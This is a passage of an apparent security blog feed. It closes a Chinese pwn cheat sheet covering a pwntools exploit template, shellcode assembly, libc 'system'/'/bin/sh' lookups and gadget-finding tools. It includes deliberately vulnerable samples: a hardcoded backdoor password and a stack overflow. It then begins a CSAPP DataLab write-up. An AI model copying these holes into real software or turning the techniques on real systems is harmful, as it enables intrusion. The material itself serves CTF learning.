class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;xxx.xxx.xxx.xxx&#x27;</span></span><br><span class="line">PORT = xxxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.clear(arch=&#x27;amd64&#x27;)</span></span><br><span class="line">context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一些常用的pwntools功能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pause()  <span class="comment"># 暂停程序执行，在send数据之前暂停才有效，通常用来暂停程序执行等到用gdb进行attach</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># send and recv.</span></span><br><span class="line">conn.sendline(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">line = conn.recvline()</span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;Name : &#x27;</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">data = conn.recvall()</span><br><span class="line">data = conn.recv(<span class="number">10</span>)  <span class="comment"># recv 10 bytes data.</span></span><br><span class="line">conn.recvuntil(<span class="string">&#x27;Name : &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Auto create a new window and attach to gdb</span></span><br><span class="line">gdb.attach(conn)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x800000</span>)  <span class="comment"># 64-bits int to string, return 8 bytes string.</span></span><br><span class="line">payload = p32(<span class="number">0x800000</span>)  <span class="comment"># 32-bits int to string, return 4 bytes string.</span></span><br><span class="line">data = u64(<span class="string">&#x27;\x00\x00\xff\xff&#x27;</span>)  <span class="comment"># 64-bits string to int.</span></span><br><span class="line">data = u32(<span class="string">&#x27;\x00\x00\xff\xff&#x27;</span>)  <span class="comment"># 32-bits string to int.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write asm.</span></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov eax,1;</span></span><br><span class="line"><span class="string">push eax;</span></span><br><span class="line"><span class="string">pop eax;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">conn.send(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get libc offset.</span></span><br><span class="line">puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># Get address of the string /bin/sh&quot; from libc.</span></span><br><span class="line">str_bin_sh = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get plt or got address of a function.</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0xA4-checksec"><a href="#0xA4-checksec" class="headerlink" title="0xA4 checksec"></a>0xA4 checksec</h2><p>用来对一个二进制程序进行安全检查，检查是否开启常用的安全措施，实际上该程序是一个属于pwntools的python脚本。</p><p><img src="/2020/10/10/StackOverflow-CheatSheet/9.png"></p><h2 id="0xA5-asm-online"><a href="#0xA5-asm-online" class="headerlink" title="0xA5 asm online"></a>0xA5 asm online</h2><p>一个可以在线编写汇编并且编译为hex字符串的<a href="https://defuse.ca/online-x86-assembler.htm#disassembly">网站</a>，支持x86与x64，很方便编写和检查shellcode，不过pwntools中集成了便携asm的api。</p><h2 id="0xA6-libc-database"><a href="#0xA6-libc-database" class="headerlink" title="0xA6 libc-database"></a>0xA6 libc-database</h2><p>一个可以根据程序泄漏出的libc函数地址与函数名查询libc版本的<a href="https://libc.rip/">在线网站</a>。同时，<a href="https://github.com/niklasb/libc-database">libc-database</a>还是一个离线数据库，包含了几乎所有的libc版本，并且提供了方便的查询接口，但是该离线数据库非常大。以及<a href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a>也是一个具有同样功能的离线数据库。</p><p>安装libc-database，用get就可以自动下载所有的ubuntu的libc数据库到db目录下，通过find就可以直接根据函数名和后三个16进制的偏移识别对应的libc。前文中的dockerfile集成了libc-database，但是没有下载任何数据库，下载的libc数据库通常会达到好几个g。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/niklasb/libc-database</span><br><span class="line"><span class="built_in">cd</span> libc-database</span><br><span class="line">./get</span><br><span class="line">./find <span class="built_in">printf</span> 260 puts f30</span><br></pre></td></tr></table></figure><h2 id="0xA7-ROPgadgets"><a href="#0xA7-ROPgadgets" class="headerlink" title="0xA7 ROPgadgets"></a>0xA7 ROPgadgets</h2><p>检查一个elf文件中的所有gadgets，包括rop，jop以及cop的gadgets。安装ropgadgets，在前文的dockerfile中集成了ropgadgets。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install capstone</span><br><span class="line">pip install ropgadget</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">usage: ROPgadget.py [-h] [-v] [-c] [--binary &lt;binary&gt;] [--opcode &lt;opcodes&gt;]</span><br><span class="line">                    [--string &lt;string&gt;] [--memstr &lt;string&gt;] [--depth &lt;nbyte&gt;]</span><br><span class="line">                    [--only &lt;key&gt;] [--filter &lt;key&gt;] [--range &lt;start-end&gt;]</span><br><span class="line">                    [--badbytes &lt;byte&gt;] [--rawArch &lt;arch&gt;] [--rawMode &lt;mode&gt;]</span><br><span class="line">                    [--rawEndian &lt;endian&gt;] [--re &lt;re&gt;] [--offset &lt;hexaddr&gt;]</span><br><span class="line">                    [--ropchain] [--thumb] [--console] [--norop] [--nojop]</span><br><span class="line">                    [--callPreceded] [--nosys] [--multibr] [--all] [--noinstr]</span><br><span class="line">                    [--dump] [--silent] [--align ALIGN]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">    -h, --help           show this help message and exit</span><br><span class="line">    -v, --version        Display the ROPgadget&#39;s version</span><br><span class="line">    -c, --checkUpdate    Checks if a new version is available</span><br><span class="line">    --binary &lt;binary&gt;    Specify a binary filename to analyze</span><br><span class="line">    --opcode &lt;opcodes&gt;   Search opcode in executable segment</span><br><span class="line">    --string &lt;string&gt;    Search string in readable segment</span><br><span class="line">    --memstr &lt;string&gt;    Search each byte in all readable segment</span><br><span class="line">    --depth &lt;nbyte&gt;      Depth for search engine (default 10)</span><br><span class="line">    --only &lt;key&gt;         Only show specific instructions</span><br><span class="line">    --filter &lt;key&gt;       Suppress specific mnemonics</span><br><span class="line">    --range &lt;start-end&gt;  Search between two addresses (0x...-0x...)</span><br><span class="line">    --badbytes &lt;byte&gt;    Rejects specific bytes in the gadget&#39;s address</span><br><span class="line">    --rawArch &lt;arch&gt;     Specify an arch for a raw file</span><br><span class="line">    --rawMode &lt;mode&gt;     Specify a mode for a raw file</span><br><span class="line">    --rawEndian &lt;endian&gt; Specify an endianness for a raw file</span><br><span class="line">    --re &lt;re&gt;            Regular expression</span><br><span class="line">    --offset &lt;hexaddr&gt;   Specify an offset for gadget addresses</span><br><span class="line">    --ropchain           Enable the ROP chain generation</span><br><span class="line">    --thumb              Use the thumb mode for the search engine (ARM only)</span><br><span class="line">    --console            Use an interactive console for search engine</span><br><span class="line">    --norop              Disable ROP search engine</span><br><span class="line">    --nojop              Disable JOP search engine</span><br><span class="line">    --callPreceded       Only show gadgets which are call-preceded</span><br><span class="line">    --nosys              Disable SYS search engine</span><br><span class="line">    --multibr            Enable multiple branch gadgets</span><br><span class="line">    --all                Disables the removal of duplicate gadgets</span><br><span class="line">    --noinstr            Disable the gadget instructions console printing</span><br><span class="line">    --dump               Outputs the gadget bytes</span><br><span class="line">    --silent             Disables printing of gadgets during analysis</span><br><span class="line">    --align ALIGN        Align gadgets addresses (in bytes)</span><br><span class="line">    --mipsrop &lt;rtype&gt;    MIPS useful gadgets finder</span><br><span class="line">                         stackfinder|system|tails|lia0|registers</span><br></pre></td></tr></table></figure><p>如下图所示。</p><p><img src="/2020/10/10/StackOverflow-CheatSheet/11.png"></p><h2 id="0xA8-one-gadget"><a href="#0xA8-one-gadget" class="headerlink" title="0xA8 one_gadget"></a>0xA8 one_gadget</h2><p>检查一个libc中是否有one gadget。所谓one gadget指的是通过一个gadget，满足某种约束（例如寄存器中某个值）即可直接getshell。安装one_gadget如下。前文中的dockerfile集成了one_gadget。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt -y install ruby</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure><p>如下图所示。</p><p><img src="/2020/10/10/StackOverflow-CheatSheet/12.png"></p><p>以上图第2个one gadget为例，若可以满足rsp+0x40为0，则直接跳转到libc中的0x4f3c2偏移就可以调用execve来get shell。需要注意的是使用one gadget必须要先知道libc的基址。</p><h2 id="0xA9-ropper"><a href="#0xA9-ropper" class="headerlink" title="0xA9 ropper"></a>0xA9 ropper</h2><p>类似ropgadget的工具，但是输出更好看一点，找到的gadgets貌似也更多一点，安装如下。前文中的dockerfile集成了ropper。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install ropper</span><br></pre></td></tr></table></figure><p>如下图所示。</p><p><img src="/2020/10/10/StackOverflow-CheatSheet/13.png"></p><h2 id="0xA9-Angr"><a href="#0xA9-Angr" class="headerlink" title="0xA9 Angr"></a>0xA9 Angr</h2><p>angr是一个python库，主要用来求解多种约束下的某一条程序路径所对应的输入。angr的安装如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-dev libffi-dev build-essential virtualenvwrapper</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不过angr非常大，所以一般推荐使用angr的docker。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install docker</span></span><br><span class="line"><span class="comment"># curl -sSL https://get.docker.com/ | sudo sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pull the docker image</span></span><br><span class="line">sudo docker pull angr/angr</span><br><span class="line"></span><br><span class="line"><span class="comment"># run it</span></span><br><span class="line">sudo docker run -it angr</span><br></pre></td></tr></table></figure><p>angr主要是为了逆向而生，比如某程序有如下约束条件才可以继续执行。该程序来自angr官方示例。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *sneaky = <span class="string">&quot;SOSNEAKY&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">authenticate</span><span class="params">(<span class="keyword">char</span> *username, <span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> stored_pw[<span class="number">9</span>];</span><br><span class="line">stored_pw[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> pwfile;</span><br><span class="line"></span><br><span class="line"><span class="comment">// evil back d00r</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(password, sneaky) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">pwfile = open(username, O_RDONLY);</span><br><span class="line">read(pwfile, stored_pw, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(password, stored_pw) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accepted</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to the admin console, trusted user!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rejected</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Go away!&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> username[<span class="number">9</span>];</span><br><span class="line"><span class="keyword">char</span> password[<span class="number">9</span>];</span><br><span class="line"><span class="keyword">int</span> authed;</span><br><span class="line"></span><br><span class="line">username[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">password[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Username: \n&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, username, <span class="number">8</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;authed, <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Password: \n&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, password, <span class="number">8</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;authed, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">authed = authenticate(username, password);</span><br><span class="line"><span class="keyword">if</span> (authed) accepted();</span><br><span class="line"><span class="keyword">else</span> rejected();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该程序要求我们输入一个正确的用户名和密码，通过手工逆向是可以很容易找到的，但是利用angr的脚本如下，其中fauxware是程序名，最后打印出了所有可能的通过检查的路径分支所对应的输入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">basic_symbolic_execution</span>():</span></span><br><span class="line">    p = angr.Project(<span class="string">&#x27;fauxware&#x27;</span>)</span><br><span class="line">    state = p.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    path = p.factory.path(state)</span><br><span class="line"></span><br><span class="line">    pathgroup = p.factory.path_group(path)</span><br><span class="line">    pathgroup.step(until=<span class="keyword">lambda</span> lpg: len(lpg.active) &gt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(pathgroup.active)):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;possible %d: &quot;</span> % i, pathgroup.active[i].state.posix.dumps(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">print</span> basic_symbolic_execution()</span><br></pre></td></tr></table></figure><p>假设有如下存在栈溢出的程序，但是首先需要我们输入一个密码才可以进入触发栈溢出的函数。为了简化难度，直接假设密码比较简单，但是实际情况下手工逆向出密码非常复杂。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    char buf[<span class="number">20</span>]</span><br><span class="line">    char name[<span class="number">9</span>];</span><br><span class="line">    scanf(<span class="string">&quot;%s&quot;</span>,name);</span><br><span class="line">    <span class="keyword">if</span>(!strcmp(name,<span class="string">&quot;jsk&quot;</span>))&#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x20</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    printf(<span class="string">&quot;failed\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>求解这类问题的angr脚本如下。其中pwn为二进制程序名，find参数为成功的路径的地址，对应到程序中就是main中调用read的地址，avoid参数为失败的路径的地址，对应到程序中就是main中调用printf的地址，最后打印出找到的可以到达成功路径地址的输入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    p = angr.Project(<span class="string">&quot;pwn&quot;</span>)</span><br><span class="line">    state = p.factory.entry_state()</span><br><span class="line">    sm = p.factory.simgr(state)</span><br><span class="line">    sm.explore(find=<span class="number">0x0804939D</span>, avoid=<span class="number">0x080493B1</span>)</span><br><span class="line">    print(sm.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>一个真实的ctf示例如下，首先要求我们输入一个key，通过一系列检查这个函数才会返回1，表示输入了正确的key，才可能会触发后续的漏洞利用，在这种场景下angr是最合适的。</p><p><img src="/2020/10/10/StackOverflow-CheatSheet/15.png"></p><h2 id="0xAA-seccomp-tools"><a href="#0xAA-seccomp-tools" class="headerlink" title="0xAA seccomp-tools"></a>0xAA seccomp-tools</h2><p>检查程序开启的seccomp沙箱策略。安装如下。前文中的dockerfile集成了seccomp-tools。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install seccomp-tools</span><br></pre></td></tr></table></figure><p>如下图所示。</p><p><img src="/2020/10/10/StackOverflow-CheatSheet/14.png"></p><p>以上图为例，只允许的系统调用为re_sigreturn，sigreturn，exit_group，exit，open，read，write。需要注意的是要是用该工具检查elf的沙箱策略，该工具必须先运行一遍elf文件。</p>]]></content>
    
    
    <summary type="html">Stack Overflow payloads and attack methods.</summary>
    
    
    
    <category term="Hack" scheme="https://srpopty.github.io/categories/Hack/"/>
    
    
    <category term="Pwn" scheme="https://srpopty.github.io/tags/Pwn/"/>
    
    <category term="CheatSheet" scheme="https://srpopty.github.io/tags/CheatSheet/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP-DataLab WriteUp</title>
    <link href="https://srpopty.github.io/2020/08/14/CSAPP-DataLab%20WriteUp/"/>
    <id>https://srpopty.github.io/2020/08/14/CSAPP-DataLab%20WriteUp/</id>
    <published>2020-08-14T09:02:30.000Z</published>
    <updated>2020-08-16T09:56:16.268Z</updated>
    
    <content type="html"><![CDATA[<p>在这个Lab中主要需要完成bits.c文件中的部分函数以实现函数功能，代码必须顺序执行，即不能使用if条件分支或者While循环这一类，此外对于函数的实现必须使用指定的位操作符，例如与或非(&amp;,|,)等，具体每个函数的限制也不一样。</p><p>在完成bits.c后使用dlc进行检查，例如<code>./dlc bits.c</code>，检查函数的实现是否遵循指定的规则，检查通过后使用btest开始测试函数的输入与输出，btest需要先编译再运行，例如<code>make clean &amp;&amp; make btest &amp;&amp; ./btest</code>。btest将会对每一个函数给定指定的输入，检查输出是否正确，每一个函数都有一个等级与分值，等级越高难度和分数也越高。</p><p>具体规则如下：</p><ul><li>函数中禁止使用if, do, while, for, switch之类的控制语句。</li><li>文件中禁止定义任何宏，禁止定义任何额外的函数。</li><li>禁止调用函数。</li><li>在int类型的题目中禁止定义除int类型以外的变量。在float类型的题目中禁止定义除int和unsigned类型以外的变量，也禁止使用flaot类型与浮点数操作符。</li><li>函数中定义int类型的常量范围在<code>0x00 &lt;= int &lt;= 0xff</code>，不能大于0xff。</li><li>不能使用全局变量，只能使用函数参数与局部变量。</li><li>操作符限制为一元操作符<code>! ~</code>和位操作符<code>&amp; ^ | + &lt;&lt; &gt;&gt;</code>，部分函数中可能仅允许使用一部分操作符。禁止使用二元与三元操作符，例如<code>|| &amp;&amp; ? -</code></li><li>在每个函数中会限制出现的操作符的数量，一条语句可以使用多个数量限制内的操作符。</li></ul><h1 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h1><p>在C语言中，32位的操作系统上一个int类型的变量占32个比特位，即4个字节。从右向左，代表从低位到高位，其中最高位(最左边)的比特位表示该数字的符号，1表示该数字为负数，0表示该数字为正数，后续的31个比特位中存放才是该数字的二进制数据，能存储的数字范围为$-2^31&lt;=int&lt;=2^31$，即$-2147483648&lt;=int&lt;=2147483648$。与int相比，无符号数unsigned int不需要符号位，所以可以多存储一位数据，其范围为$-4294967296&lt;=unsigned&lt;=4294967296$。</p><p>上述的数值二进制表示方法称为原码，除了原码，计算机中还有反码与补码两种表示方法。正数的反码与补码和原码相同，而负数的反码为：符号位不变，其余位取反，负数的补码为：负数的反码加1。反码的意义在于进行减法的时候计算机计算比较方便，而补码的意义在于解决+0与-0的问题：由于int的最高位是符号位，当数据位都为0时，数字0就有了两种表示方法，符号位是0(即0x0)代表+0和符号位是1(即0x80000000)代表-0。此外补码还可以得到该数的相反数。</p><p>位操作符是C语言中最基本的操作符，将两个数字按比特位进行操作，使用位操作符的计算速度是最快的。C语言中主要有以下位操作符，其中移位运算符的优先级比算术运算符的优先级更低。</p><table><thead><tr><th>符号</th><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>&amp;</td><td>位且</td><td>两个数按位进行且运算，两个相比较的比特位中只要有一个0，那么该位的结果就是0</td></tr><tr><td>|位或</td><td>两个数按位进行或运算，两个相比较的比特位中只要有一个1，那么该位的结果就是1</td><td></td></tr><tr><td>^</td><td>异或</td><td>两个数按位进行异或运算，两个相比较的比特位如果不一样那么该位的结果为1，否则为0</td></tr><tr><td>~</td><td>取反</td><td>将该数按位进行取反，0变成1，1变成0</td></tr><tr><td>&lt;&lt;</td><td>算术左移</td><td>将该数每一位左移指定位数，右边补0，左移几位就是将原数乘以2的几次方</td></tr><tr><td>&gt;&gt;</td><td>算术右移</td><td>将该数每一位右移指定位数，左边补符号位，若符号位是1则补1，负责补0，仅针对正数而言右移几位就是将原数除以2的几次方</td></tr></tbody></table><p>浮点数的表示方法与整数完全不同。IEEE规定单精度浮点数float用1位表示符号，8位表示指数，剩下的23位表示尾数，双精度浮点数用1位表示符号，11位表示指数，剩下的52位表示尾数。在计算机中任何浮点数都可以表示为<br>$$(-1)^s*(1.m)^*2^(E-127)$$</p><p>其中s代表符号位，m代表尾数，E代表阶码。</p><ul><li>如果阶码E=255并且m非零，则该数不是一个属，代表NaN(Not a number)。</li><li>如果阶码E=255并且m为0，那么该数根据符号位代表正负无穷。</li><li>如果阶码E=0并且m为0，那么该数根据符号位代表正负零。</li></ul><h1 id="Bit-Manipulations"><a href="#Bit-Manipulations" class="headerlink" title="Bit Manipulations"></a>Bit Manipulations</h1><h2 id="bitAnd"><a href="#bitAnd" class="headerlink" title="bitAnd"></a>bitAnd</h2><p>使用<code>~</code>与<code>|</code>实现位与运算符，例如<code>bitAnd(6, 5) = 6 &amp; 5 =4</code>，最大操作符数量为8，等级为1。</p><p>根据对合律与对偶律可得<code>a&amp;b = ~(~(a&amp;b))=~(~a|~b)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bitAnd - 